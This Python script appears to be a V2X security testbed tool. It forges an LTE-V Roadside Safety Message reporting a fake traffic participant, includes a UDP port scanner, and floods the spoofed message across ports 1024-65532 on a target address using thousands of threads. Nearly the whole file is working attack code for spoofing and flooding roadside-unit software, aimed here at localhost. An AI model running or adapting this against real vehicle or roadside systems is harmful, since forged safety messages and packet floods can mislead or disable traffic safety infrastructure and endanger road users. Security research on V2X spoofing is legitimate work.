import threading
import math
import os
import socket

import asn1tools
from message.MsgFrame import RSM_MsgFrame
from message import RSM

def build_attack_message(add_noise_x, add_noise_y, add_noise_yaw):
    dir = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))
    asnPath = os.path.join(dir, 'message', 'asn', 'LTEV.asn')
    ltevCoder = asn1tools.compile_files(asnPath, 'uper', numeric_enums=True)

    rsm_message = RSM_MsgFrame()
    id = str(200)
    rsm_message['id'] = '{:0>8}'.format(id)

    earth_radius = 6371004
    lat = add_noise_y * 180.0 / (math.pi * earth_radius) + 39.5427
    longi = (add_noise_x * 180.0 / (math.pi * earth_radius)) / math.cos(lat * math.pi / 180.0) + (116.2317)

    rsm_message['refPos']['lat'] = int(1e7 * lat)
    rsm_message['refPos']['long'] = int(1e7 * longi)
    rsm_message['refPos']['elevation'] = 0

    participant = RSM.RSMParticipantData_DF()
    x, y, z = 1000, 1000, 1000
    yaw, pitch, roll = 180, 0, 0

    lat = y * 180.0 / (math.pi * earth_radius) + 39.5427
    longi = (x * 180.0 / (math.pi * earth_radius)) / math.cos(lat * math.pi / 180.0) + (116.2317)

    id = str(200)
    participant['id'] = '{:0>8}'.format(id)
    participant['pos']['offsetLL'] = ('position-LatLon', {'lon': int(1e7 * longi), 'lat': int(1e7 * lat)})
    participant['pos']['offsetV'] = ('elevation', int(100 * z))

    if yaw < 0:
        yaw += 360
    if yaw > 359.9875:
        yaw = 359.9875
    participant['speed'] = int(0 * 50)
    participant['heading'] = int(yaw * 80)
    rsm_message['participants'].append(participant)

    rsm_encoded = ltevCoder.encode('RoadsideSafetyMessage', RSM.PrepareForCode(rsm_message))
    AID = int(2).to_bytes(length=4, byteorder='big')
    rsm_encoded = AID + rsm_encoded
    rsm_encoded_str = rsm_encoded.hex()
    attack_message = rsm_encoded_str.encode('utf-8')
    return attack_message

def send_packet(udp_socket, attack_message, attack_address):
    try:
        udp_socket.sendto(attack_message, attack_address)
        print(f'Sent {attack_message} to {attack_address}')
    except Exception as e:
        print(f'Error sending packet to {attack_address}: {e}')

def udp_scan(target_ip, start_port, end_port, timeout=1):
    udp_port_list = []
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        for port in range(start_port, end_port + 1):
            try:
                sock.sendto(b'ping', (target_ip, port))
                sock.recvfrom(1024)
                udp_port_list.append(port)
            except socket.timeout:
                print(f'Port {port} is closed')
            except Exception as e:
                print(f'Error on port {port}: {e}')
    return udp_port_list

if __name__ == '__main__':
    target_ip = '127.0.0.1'
    start_port = 1024
    end_port = 65532

    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    add_noise_x, add_noise_y, add_noise_yaw = 0, 0, 0  # 假设这些值不变

    threads = []
    for i in range(1000):
        attack_message = build_attack_message(add_noise_x, add_noise_y, add_noise_yaw)
        for port in range(start_port, end_port + 1):
            attack_address = (target_ip, port)
            thread = threading.Thread(target=send_packet, args=(udp_socket, attack_message, attack_address))
            threads.append(thread)
            thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()